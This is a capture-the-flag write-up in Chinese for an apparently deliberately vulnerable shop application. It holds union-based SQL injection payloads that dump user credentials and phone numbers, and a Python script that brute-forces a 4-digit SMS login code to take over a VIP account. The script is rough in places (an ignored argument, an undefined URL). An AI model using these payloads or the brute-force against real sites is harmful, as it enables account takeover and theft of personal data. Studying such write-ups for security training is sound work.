# WriteUp 

**hint**

1. User
2. VIP_FIND_MY_PHONE 
3. 4位数字

#### 1. 查询订单页面存在sql注入 
```sql
第一步获取通过测试控制回显列
------------------------------ 
# 测试出回显列数
123 order by 5;

# 判断回显信息位置,发现没有显示，因为每次只能查询一次订单信息，考虑使用联合查询
123 union select 1,2,3,4,5;

# 使用一个很大的订单号（可以连续几次下单发现订单号是自增长的）使union前的语句无法查询出结果，获得回显信息
或者使判断恒不成立
1000000 union select 1,2,3,4,5;
and 1=2 union select 1,2,3,4,5;


第二步分析查询数据发现User表的存在，并找到列名
------------------------------ 
# 获取到表名:Orders （可以分析出作者的变量命名风格）
1000000 union select 1,2,user(),version(),table_name from information_schema.tables where table_schema=database();--

# 获取订单表的列名 列名需要16进制编码
798 and 1=2 union select 1,2,3,4,group_concat(column_name) from information_schema.columns where table_name=0x4f7264657273;
# 结果:orderid,userid,prodid,totalPrice,createtime

# 知道列名之后就可以查看订单了，查看订单发现userid=1的用户购买过价值1000的flag,后期重点关注
798 and 1=2 union select orderid,userid,prodid,totalPrice,createtime from Orders;

# 获取用户表的列名（猜测用户表名为User或者Users,最终User成功）
798 and 1=2 union select 1,2,3,4,group_concat(column_name) from information_schema.columns where table_name=0x55736572;
# 结果:id,username,password,phonenumber,money

第三步从User表中获得VIP用户的手机号码
------------------------------ 
# 尝试查询User,获得用户手机号（此处使用子查询，因为联合查询的两张表数据类型可能不一致）
798 and 1=2 union select 1,(select concat_ws(char(32,58,32),username,password,phonenumber,money) from User limit 0,1),3,4,5;--
```

#### 2. 手机号验证码登录枚举验证码

```python
import requests as req
import re
import sys
import json
import random
import time

class exp:
    def __init__(self,phonenumber):
        self.phonenumber = 0
        self.session = req.session()
        
    def crackVerifyCode(self):
        '暴力破解手机号验证码'
        crackStatus = False
        while True:
            # 请求发送验证码
            while True:
                rs = self.session.get(self.url + '/src/user/sendVerifyCode.php', params={'phonenumber': self.phonenumber},timeout=10)
                status = json.loads(rs.text).get('status')
                data = json.loads(rs.text).get('data')
                #print(data)
                if (status):
                    break
            # 爆破当前验证码
            for verifycode in range(10000)[6644:]:
                rs = self.session.get(self.url + '/src/user/verifyPhoneVc.php', params={'phonenumber': self.phonenumber, 'verifycode': verifycode},timeout=10)
                crackStatus = json.loads(rs.text).get('status')
                data = json.loads(rs.text).get('data')
                if(crackStatus):# 成功爆破
                    break
            if (crackStatus): # 未爆破成功应该时验证码过期了因此重新尝试
                break

    def getFlag(self):
        '通过购买商品获取flag'
        rs = self.session.get(self.url + '/src/order/placeAnOrder.php', params={'prodid': 1}, timeout=10)
        status = json.loads(rs.text).get('status')
        data = json.loads(rs.text).get('data')
        matchObj = re.search(r'flag{.*}', data, re.M | re.I)
        if (status and matchObj):
            print("Flag is:",matchObj.group())

if __name__ == '__main__':
    phonenumber=12312
    exp=exp(phonenumber)
	exp.crackVerifyCode()
    exp.getFlag()
```

